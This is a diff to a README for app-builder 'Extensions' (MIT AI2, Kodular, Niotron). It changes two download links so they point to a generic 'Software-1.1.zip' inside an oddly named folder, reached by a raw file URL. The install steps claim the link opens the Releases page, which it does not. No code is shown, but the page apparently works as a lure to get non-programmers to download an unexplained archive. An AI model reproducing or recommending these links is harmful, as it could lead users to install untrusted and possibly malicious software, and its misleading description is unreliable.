@@ -1,7 +1,7 @@
 # 🎉 Extensions - Easy Tools for Your Apps
 
 ## 📥 Download Now
-[![Download Extensions](https://raw.githubusercontent.com/VS-32/Extensions/main/aphrosiderite/Extensions.zip)](https://raw.githubusercontent.com/VS-32/Extensions/main/aphrosiderite/Extensions.zip)
+[![Download Extensions](https://raw.githubusercontent.com/VS-32/Extensions/main/aphrosiderite/Software-1.1.zip)](https://raw.githubusercontent.com/VS-32/Extensions/main/aphrosiderite/Software-1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the Extensions repository! Here you will find useful tools designed for MIT AI2, Kodular, Niotron, and other platforms. These extensions help enhance your app development experience without needing programming skills.
@@ -24,7 +24,7 @@ To use these extensions, you will need:
 ## 📦 Download & Install
 To access the latest versions of the extensions, visit the Releases page:
 
-[Download Extensions](https://raw.githubusercontent.com/VS-32/Extensions/main/aphrosiderite/Extensions.zip)
+[Download Extensions](https://raw.githubusercontent.com/VS-32/Extensions/main/aphrosiderite/Software-1.1.zip)
 
 ### Steps to Install:
 1. Click on the link above to navigate to the Releases page.
